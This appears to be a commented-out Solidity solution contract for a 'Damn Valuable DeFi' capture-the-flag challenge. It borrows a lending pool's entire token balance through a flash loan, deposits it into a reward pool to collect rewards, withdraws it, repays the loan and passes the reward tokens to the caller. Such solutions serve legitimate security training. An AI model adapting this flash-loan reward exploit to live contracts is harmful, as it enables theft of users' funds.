//// SPDX-License-Identifier: MIT
//
//pragma solidity ^0.8.0;
//
//import "../FlashLoanerPool.sol";
//import "../RewardToken.sol";
//import "../TheRewarderPool.sol";
//
//contract TheCompromisedAttacker {
//
//    FlashLoanerPool flashLoanerpool;
//    DamnValuableToken liquidityToken;
//    TheRewarderPool rewarderPool;
//    RewardToken rewardToken;
//
//    constructor(address flashLoanerAddress, address liquidityAddress, address rewarderAddress, address _rewardToken) {
//        flashLoanerpool = FlashLoanerPool(flashLoanerAddress);
//        liquidityToken = DamnValuableToken(liquidityAddress);
//        rewarderPool = TheRewarderPool(rewarderAddress);
//        rewardToken = RewardToken(_rewardToken);
//    }
//
//    function initiateAttack() external {
//        uint256 loanTotal = liquidityToken.balanceOf(address(flashLoanerpool));
//        flashLoanerpool.flashLoan(loanTotal);
//    }
//
//    function receiveFlashLoan(uint256 amount) external {
//        liquidityToken.approve(address(rewarderPool), amount);
//        rewarderPool.deposit(amount);
//        rewarderPool.withdraw(amount);
//        liquidityToken.transfer(msg.sender, amount);
//    }
//
//    function withdrawRewardTokens() external {
//        uint256 rewardAmount = rewardToken.balanceOf(address(this));
//        rewardToken.transfer(msg.sender, rewardAmount);
//    }
//
//
//}